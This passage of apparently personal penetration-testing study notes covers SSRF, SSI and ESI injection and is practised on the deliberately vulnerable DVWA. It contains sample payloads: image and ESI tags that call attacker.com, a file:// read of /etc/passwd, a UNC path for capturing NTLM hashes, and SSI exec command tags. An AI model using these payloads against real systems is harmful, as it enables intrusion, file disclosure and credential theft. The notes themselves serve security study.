+</code></pre><p id="9b592fe5-fb58-4c64-9c7f-5ba7f754e445" class="">The safest way to fetch a remote file by the target website would be to do it using client-side javascript. In such a case, the request is performed by the users computer and no application infrastructure takes part in requesting the remote resources.</p><h3 id="bf3a95ad-7aa3-4041-9733-90c607e12894" class=""><strong>When SSRF is a Feature</strong><strong><a href="https://johnermac.github.io/notes/ewptx/serverside/#when-ssrf-is-a-feature"></a></strong></h3><p id="6b9012ef-3a3a-4ab5-9ea9-ea35228ec336" class="">SSRF attack can be conducted not only against <strong>image import</strong> utilities but any mechanisms that rely on fetching remote resources. In web apps typically it can be:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="6616761c-608f-4df8-b0c2-ac534b76fa6f" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">- API specification imports (WSDL imports)
+- Other file imports
+- Connection to remote server (FTP)
+- **ping** or **alivecheck** utilities
+- Any parts of an http request that includes URLs
+</code></pre><h3 id="c51efe4f-2214-4abb-8fc2-e02e519dd53f" class=""><strong>Blind SSRF Exploitation</strong><strong><a href="https://johnermac.github.io/notes/ewptx/serverside/#blind-ssrf-exploitation"></a></strong></h3><p id="7a15f69f-095b-4227-9382-7f3b885b5209" class="">Example: document generators</p><p id="1726d9f2-a107-49e9-ae3f-bd67410b885b" class="">If one is able to inject content into an online PDF generator, inserting something like the code below might likely lead to receiving a GET request from the parser server. Its because the server-side content parser will try to evaluate the content before rendering the PDF</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="67b8652b-0c7e-4d4d-a70e-78ae4927bec0" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">&lt;img src=http://attacker.com:80/ssrf&gt;
+</code></pre><ul id="88cbec55-0988-496b-8b33-711255ea920a" class="bulleted-list"><li style="list-style-type:disc">It will then parse the IMG tag and try to fetch the remote picture without knowing that it does not exist</li></ul><ul id="af9767e0-c207-4251-b162-dad3de7ff014" class="bulleted-list"><li style="list-style-type:disc">SSRF payloads can be inserted in HTTP request headers. You can, For example, place your domain in any HTTP header and look For HTTP or DNS resolution</li></ul><blockquote id="434a8234-c953-47e9-9c45-c7af55135b63" class="">in BURP intruder u can feed it with a list of all HTTP headers and assign your domain to each of them. its possible that some of the intermediate proxies might try to resolve these domains.</blockquote><h3 id="644e4903-ca28-4f71-8acd-2f1f0cb5940e" class=""><strong>URL Structure</strong><strong><a href="https://johnermac.github.io/notes/ewptx/serverside/#url-structure"></a></strong></h3><p id="c846cb69-451b-4322-866d-ba70374413b7" class="">https://chromium.googlesource.com/chromium/src/+/master/docs/security/url_display_guidelines/url_display_guidelines.md</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="852e43cc-ece3-47c7-99d1-3e35e613f3e2" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">https://user:pass@sub.example.com:8080/path?query#fragment
+</code></pre><h3 id="94584c5e-e19c-495e-b132-a63e55ab213b" class=""><strong>SSRF Example</strong><strong><a href="https://johnermac.github.io/notes/ewptx/serverside/#ssrf-example"></a></strong></h3><p id="cafbc570-c069-4cf3-aa58-6027e647ca73" class="">https://github.com/ethicalhack3r/DVWA</p><p id="660eb6c5-5508-4570-81bb-07be0e6f1978" class="">We will use the <strong>File Inclusion</strong> module, which is similar to a web app fetch file functionalities. DVWA has to run in <strong>Low</strong> security mode.</p><ul id="3e7de146-7478-4fc0-a343-8d94ea4db3f8" class="bulleted-list"><li style="list-style-type:disc">We want to proxy our requets via BURP</li></ul><p id="f067bbe3-2bbb-43d4-a0a7-045e29a44876" class="">Install socat</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2e4d410f-c5f4-442b-a4c4-079cf2a42077" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">apt install socat
+</code></pre><p id="ff25fccb-3b67-470f-9b83-d097c8830b49" class="">Then the DVWA is exposed via port forwarding using socat external port 800 will be connected to internal 80. This will expose ur vuln app to the outside world</p><p id="ee56f4f1-a872-450e-b0e1-f9f2145d136a" class="">Forward:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="cb3aaf47-c1b4-43f4-83dd-958109a9a458" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">sudo socat tcp-listen:800,fork tcp:127.0.0.1:80
+
+# Now its exposed
+</code></pre><p id="a800606f-1d73-40e3-b5bb-ccfbb3dd173a" class="">We can try to start a listener in netcat and fetch its address via a GET request</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="6f47aad5-c535-47b8-821c-b7a40b90e436" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">GET /DVWA/vulnerabilities/f?page=http://test:pwd@127.0.0.1:21/a HTTP/1.1
+</code></pre><h3 id="c529cdf6-bb40-484c-b829-93943f66e560" class=""><strong>Forcing Authentication</strong><strong><a href="https://johnermac.github.io/notes/ewptx/serverside/#forcing-authentication"></a></strong></h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="8e38d335-9421-4647-8b14-355b241f671b" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">nv -lvnp 21
+
+# the back-end used the username:password combination as a Basic Authentication header!
+# This means, when issuing an arbitrary request, we can also do it to like basic authentication protected resources
+</code></pre><h3 id="5634d0a1-81e3-4799-ad09-d4e08f7d8ab4" class=""><strong>Changing Protocol</strong><strong><a href="https://johnermac.github.io/notes/ewptx/serverside/#changing-protocol"></a></strong></h3><p id="f3c1476f-cdca-4fc4-b5b9-8589960dc83e" class="">DVWA also accepts an https URL scheme and tries to establish an encrypted connection:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="e8515454-0dd2-456c-853b-3b6004ad8133" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">GET /DVWA/vulnerabilities/f?page=https://test:pwd@127.0.0.1:21/ssl HTTP/1.1
+</code></pre><p id="05035f7e-b8cd-4d08-a993-c9523a42f9f8" class="">Since we are using a plaintext connection netcat, we just see the attempt to establish SSL to our listener</p><p id="8673b335-65e8-41c3-a6a5-057e725e3e01" class="">The ‘file://’ scheme is also accepted, resulting in file inclusion.</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="11b98709-7d82-4830-9ac2-6324576d2fe5" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">GET /DVWA/vulnerabilities/f?file=http:///etc/passwd HTTP/1.1
+</code></pre><p id="4ed3c359-13fa-4e35-85fa-f036ea963ff8" class="">You can always test more protocols handlers</p><p id="758af30e-536b-435c-9e0c-0720fa379b40" class="">https://www.php.net/manual/en/wrappers.php</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="7282e42b-4ec7-4a70-b19f-8aa52ea943ff" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">- file:// # accessing local filesystem
+- http:// # accessing HTTP(s) URLs
+- ftp://  # accessing FTP(s) URLs
+- php://  # accessing various I/O streams
+- zlib:// # compression streams
+- data:// # data (RFC 2397)
+- glob:// # find pathnames matching patterns
+- phar:// # php archive
+- ssh2:// # secure shell 2
+- rar://  # rar
+- ogg://  # audio streams
+- expect:// # process interaction streams
+</code></pre><h3 id="3a9fa52c-a046-45cc-adca-86cf76fc3012" class=""><strong>Attacking SSRF on Windows</strong><strong><a href="https://johnermac.github.io/notes/ewptx/serverside/#attacking-ssrf-on-windows"></a></strong></h3><p id="fc98419d-1f58-440b-b133-3a74ddc86dbe" class="">You can try to access a UNC path in the following format:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="fb50f3bd-0c58-44d3-adf0-7cf98d979708" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">file:///\\attackerdomain\sharename
+</code></pre><ul id="99437c11-c0d3-414d-b591-2ba3aae3f39e" class="bulleted-list"><li style="list-style-type:disc">https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dtyp/62e862f4-2a51-452e-8eeb-dc4ff5ee33cc</li></ul><p id="60f1e69a-b294-4d06-a266-f980d9af23fd" class="">If the server tries to authenticate to a fake share, you might be able to steal its NTLM password hash. The hash can be subject to further offline cracking.</p><p id="ca118d12-4640-4dea-9f5a-b6c10484a4d6" class="">SMB authentication attempts can be captured (e.g. using the metasploit module)</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="d6896d3c-e361-49f4-9988-597089ba4801" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">auxiliary/server/capture/smb
+</code></pre><h3 id="d842b0ba-66a2-45c0-9f39-b79918f16888" class=""><strong>Other SSRF Scenarios</strong><strong><a href="https://johnermac.github.io/notes/ewptx/serverside/#other-ssrf-scenarios"></a></strong></h3><p id="2a930638-5b10-46a0-b9e3-843250aea2dd" class="">Sometimes, it will be possible to fetch a remote HTML file.</p><p id="45ac5d21-63b8-4bfe-9acd-cc7aa2f6c6bf" class="">So, SSRF will lead to Reflected XSS:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="f4c861bf-be50-4f96-bf33-d39b1bcec236" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">cat xss.html
+# &lt;script&gt;alert(document.domain)&lt;/script&gt;
+</code></pre><blockquote id="5847c186-2f9e-44a2-a369-e6b6b7c8e7ed" class="">Upon visiting the URL, the remote HTML file is included by the server</blockquote><h3 id="cdaf8977-3c03-4911-8d32-ea02d6a19db2" class=""><strong>Time-based SSRF</strong><strong><a href="https://johnermac.github.io/notes/ewptx/serverside/#time-based-ssrf"></a></strong></h3><p id="ac22b758-e96a-4e04-9bf4-da94109e8e3d" class="">Used especially in Blind exploitation scenarios</p><ul id="8b2e7b50-8b42-4354-ba4a-3d0076718333" class="bulleted-list"><li style="list-style-type:disc">Based on differences in response time, one may be able to perform an internal port scan or internal network/domain discovery</li></ul><h3 id="c8d0b854-a841-4dca-adc8-e562fe030ae8" class=""><strong>Extending SSRF</strong><strong><a href="https://johnermac.github.io/notes/ewptx/serverside/#extending-ssrf"></a></strong></h3><p id="6f260fdb-c046-4700-8bb5-d8b9c15533e4" class="">What can we get:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="05c8c29d-3883-424d-b817-30952c11dcc0" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">- RCE (best scenario)
+- File inclusion
+- Reading sensitive data
+- Interact with internal services
+# Even executing only GET requests,
+# its enough to execute critical actions on internal services and execute arbritrary code.
+</code></pre><h2 id="b7580bdb-a6d8-4647-918a-85cbc1bba277" class=""><strong>Server-Side Include</strong><strong><a href="https://johnermac.github.io/notes/ewptx/serverside/#server-side-include"></a></strong></h2><p id="e59ac473-7657-4f71-bc83-9bf8eb9c30b7" class="">Its a language-neutral web server technology that supports creating dynamic content before rendering the page.</p><ul id="d357e7f1-d76d-4175-9e6b-3f194349cd86" class="bulleted-list"><li style="list-style-type:disc">when the web app makes use of <strong>.shtml</strong>, <strong>.shtm</strong> or <strong>.stm</strong> pages</li></ul><p id="6945cb9f-37bd-4fdd-9531-abef5faed1df" class="">The best options is to inject examplary SSI tags into the web app and observer the place where they are rendered.</p><blockquote id="cf9c952e-aed9-478f-9dc9-704f5806472f" class="">U can add examplary of SSI payloads in the BURP intruder list</blockquote><h3 id="614b4901-3ad6-4545-898f-fec55eaefe20" class=""><strong>SSI Expressions</strong><strong><a href="https://johnermac.github.io/notes/ewptx/serverside/#ssi-expressions"></a></strong></h3><p id="406dfdfc-1146-4ec5-b64e-a93c28ff0680" class="">Example:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="ba7c7d49-111a-460e-8506-49795e18a304" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">&lt;!--#directive param=&quot;value&quot;-- &gt;
+</code></pre><p id="adaeb7b0-d6d0-429a-921c-32a287def308" class="">You can try to execute commands For printing server-side variables:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="3f879710-1b87-4ed5-9afa-d723c708e44c" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">&lt;!--#echo var=&quot;DOCUMENT NAME&quot;-- &gt;
+&lt;!--#echo var=&quot;DATE LOCAL&quot;-- &gt;
+&lt;!--#include virtual=&quot;/index.html&quot;-- &gt;
+&lt;!--#exec cmd=&quot;dir&quot;-- &gt;
+&lt;!--#exec cmd=&quot;ls&quot;-- &gt;
+</code></pre><h3 id="aaff635f-89ca-4421-8a61-e5efb42254e3" class=""><strong>SSI Practice</strong><strong><a href="https://johnermac.github.io/notes/ewptx/serverside/#ssi-practice"></a></strong></h3><p id="53f01e7c-5b47-4966-903f-bd9b1dc8fa65" class="">You can practice here:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="e587a98f-3967-4001-a5dc-7630204fd6d1" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">https://www.owasp.org/index.php/OWASP_Broken_Web_Applications_Project
+</code></pre><h2 id="494d5a42-d0a8-4904-8896-fdeb12149419" class=""><strong>Edge Side Includes (ESI)</strong><strong><a href="https://johnermac.github.io/notes/ewptx/serverside/#edge-side-includes-esi"></a></strong></h2><p id="1530b80a-0534-466a-9f79-ead2738a12cc" class="">Proxies and other similar intermediate infrastructure utilize them</p><ul id="819d131d-4d96-4b41-aa33-74691e48234f" class="bulleted-list"><li style="list-style-type:disc">modern web app often consist of several intermediate server before users requests reach the end application server. We should try to interact with such intermediate infrastructure by injecting some ESI tags to our requests</li></ul><ul id="9c18f04b-7375-4971-b790-8e900a6c36ea" class="bulleted-list"><li style="list-style-type:disc">ESI has a form of XML Tags, which are dynamically added to cached static content in order to enrich them with some dynamic features.</li></ul><ul id="253f2481-bbc1-4beb-a702-cad87d749bba" class="bulleted-list"><li style="list-style-type:disc">The ESI Tags are injected by cache mechanisms For other cache mechanisms; However, if a user is able to add ESI tags to the HTTP request, the proxies might parse it without knowing its origin.</li></ul><figure id="44baaa6c-43c0-4445-898e-0e633fee5caf" class="image"><a href="https://johnermac.github.io/assets/images/posts/ewptx/60.png"><img src="https://johnermac.github.io/assets/images/posts/ewptx/60.png"/></a></figure><h3 id="2096d964-4a14-466d-937d-3cb3939e1bb4" class=""><strong>ESI Expressions</strong><strong><a href="https://johnermac.github.io/notes/ewptx/serverside/#esi-expressions"></a></strong></h3><p id="61e747c9-e3c1-45be-807b-f497fc1806fb" class="">Example:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="cf796a5f-3ead-47cf-9bfc-35eb0a3cbec6" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">&lt;esi:include src=&quot;/weather/name?id=$(QUERY_STRING{city_id})&quot;/&gt;
+</code></pre><h3 id="8c9bd575-5d58-4dcd-b11d-2003bdb1ad4b" class=""><strong>ESI Detection</strong><strong><a href="https://johnermac.github.io/notes/ewptx/serverside/#esi-detection"></a></strong></h3><p id="a2945621-33ec-41c8-8e11-f5286a0ceb9e" class="">In most cases, using a Blind Attack approach</p><p id="1dadcb08-8993-4854-b241-ed52955890c7" class="">If u see the header:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="ebe13f8f-3e83-40d3-adef-26fc55d5554c" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">Surrogate-Control: content=&quot;ESI/1.0&quot;
+# in this case, u can suspect that ESI is in use.
+# However, in most cases, there will be no sign of using ESI
+</code></pre><p id="b14a6087-35f7-4068-abb9-8f4a7aec53df" class="">To detect with Blind approach, the user can try to inject tags that cause the proxies to resolve arbitrary addresses resulting in SSRF:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="4d678be1-d112-4748-a493-94fec79fa311" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">&lt;esi:include src=http://attacker.com/&gt;
+</code></pre><h3 id="5448f2c6-f657-4cc7-91eb-4cf12b803ad1" class=""><strong>ESI Exploitation</strong><strong><a href="https://johnermac.github.io/notes/ewptx/serverside/#esi-exploitation"></a></strong></h3><p id="e4ff7a1d-0907-4c97-bf3d-88d29826f429" class="">Might be possible to include a HTML file resulting in XSS:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="dfcb6bd1-6c0a-4ed7-9bf2-660599397ac3" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">&lt;esi:include src=http://attacker.com/xss.html&gt;
